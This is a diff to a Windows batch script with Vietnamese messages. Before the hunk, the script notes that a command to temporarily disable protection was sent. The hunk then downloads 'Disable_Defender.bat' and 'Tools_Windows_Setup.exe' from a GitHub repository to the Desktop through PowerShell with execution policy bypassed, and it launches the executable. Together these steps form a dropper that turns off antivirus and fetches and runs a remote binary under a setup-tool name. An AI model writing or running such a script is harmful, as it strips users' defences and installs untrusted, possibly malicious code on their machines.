@@ -35,29 +35,44 @@ echo ➜ Da gui lenh tat tam thoi (neu that bai, van tiep tuc tai file).
 echo.
 
 :: ========================
-:: TẢI FILE TỪ GITHUB
+:: TẢI FILE TỪ GITHUB (NẾU CHƯA CÓ)
 :: ========================
 set "DESKTOP=%USERPROFILE%\Desktop"
-set "URL_BAT=https://raw.githubusercontent.com/<user>/<repo>/main/file1.bat"
-set "URL_EXE=https://raw.githubusercontent.com/<user>/<repo>/main/file2.exe"
+set "FILE1=%DESKTOP%\Disable_Defender.bat"
+set "FILE2=%DESKTOP%\Tools_Windows_Setup.exe"
+set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Disable_Defender.bat"
+set "URL_EXE=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.exe"
 
-echo 📥 Dang tai file ve Desktop: %DESKTOP%
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%DESKTOP%\file1.bat' -UseBasicParsing"  || echo [-] Loi tai file1.bat
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_EXE%' -OutFile '%DESKTOP%\file2.exe' -UseBasicParsing"  || echo [-] Loi tai file2.exe
-echo.
-
-if exist "%DESKTOP%\file1.bat" (
-  echo [+] Da tai: "%DESKTOP%\file1.bat"
+if exist "%FILE1%" (
+  echo [+] Da ton tai: Disable_Defender.bat
 ) else (
-  echo [-] Khong tim thay file1.bat sau khi tai.
+  echo 📥 Dang tai Disable_Defender.bat...
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Disable_Defender.bat
 )
 
-if exist "%DESKTOP%\file2.exe" (
-  echo [+] Da tai: "%DESKTOP%\file2.exe"
-  echo 🚀 Dang mo file2.exe...
-  start "" "%DESKTOP%\file2.exe"
+if exist "%FILE2%" (
+  echo [+] Da ton tai: Tools_Windows_Setup.exe
 ) else (
-  echo [-] Khong tim thay file2.exe sau khi tai.
+  echo 📥 Dang tai Tools_Windows_Setup.exe...
+  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_EXE%' -OutFile '%FILE2%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.exe
+)
+echo.
+
+:: ========================
+:: KIỂM TRA & MỞ FILE
+:: ========================
+if exist "%FILE1%" (
+  echo [+] San sang: Disable_Defender.bat
+) else (
+  echo [-] Khong tim thay Disable_Defender.bat
+)
+
+if exist "%FILE2%" (
+  echo [+] San sang: Tools_Windows_Setup.exe
+  echo 🚀 Dang mo Tools_Windows_Setup.exe...
+  start "" "%FILE2%"
+) else (
+  echo [-] Khong tim thay Tools_Windows_Setup.exe
 )
 
 echo.
